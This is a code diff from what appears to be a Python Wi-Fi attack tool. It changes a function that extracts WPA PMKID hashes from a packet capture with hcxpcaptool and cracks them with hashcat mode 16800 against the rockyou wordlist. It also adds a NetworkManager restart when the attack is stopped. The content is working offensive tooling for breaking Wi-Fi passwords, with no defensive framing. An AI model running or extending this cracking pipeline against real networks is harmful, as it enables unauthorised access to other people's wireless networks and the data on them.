@@ -111,26 +111,25 @@ def attack_func(network_interface, attack_mode):
         get_colours("", "yellow")
         subprocess.run(["clear"])
         get_pkmid_hashes = subprocess.run(["sudo", "hcxpcaptool", "-z", "myHashes_PKMID", "Capture_PKMID"], capture_output=True, text=True)
-        print(get_pkmid_hashes.stdout)
+        subprocess.run(["clear"])
         get_colours("\nGetting hashes", "magenta")
         subprocess.run(["rm", "Capture_PKMID"])
         if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
             get_colours("\nStarting with Brute-Force attack..", "cyan")
             time.sleep(3)
             get_colours("", "yellow")
-            subprocess.run(["sudo", "hashcat", "-m", "16800", "/usr/share/wordlists/rockyou.txt", "myHashes_PKMID", "-d", "1", "--force"])
+            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID", "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
         else:
-            get_colours("\n No packet capture..", "red")
-            subprocess.run(["rm", "myHashes_PKMID*"])
+            get_colours("\nNo packet capture..", "red")
 
 
 def ctrl_c(signum, frame):
     get_colours("\nStopping attack...", "red")
     subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"])
+    subprocess.run(["sudo", "service", "NetworkManager", "restart"])
     get_colours("Network set to it's normal mode...", "magenta")
     get_colours("\n[*] Exiting the program...", "blue")
     exit(1)
-
 
 def check_parms():
     if len(sys.argv) > 1:
